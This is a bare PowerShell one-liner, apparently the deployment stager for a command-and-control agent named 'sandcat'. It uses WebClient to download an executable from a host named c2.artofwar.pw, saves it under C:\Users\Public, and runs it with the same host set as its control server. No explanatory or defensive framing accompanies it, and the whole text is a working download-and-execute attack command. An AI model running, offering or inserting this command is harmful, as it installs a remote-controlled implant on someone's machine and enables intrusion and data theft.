$server="https://c2.artofwar.pw"; $url="$server/file/download"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("platform","windows"); $wc.Headers.add("defaultServer", $server); $wc.Headers.add("file","sandcat.go"); ($data=$wc.DownloadData($url)) -and ($name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","")) -and ([io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data)) | Out-Null; iex "C:\Users\Public\$name.exe -v -server $server";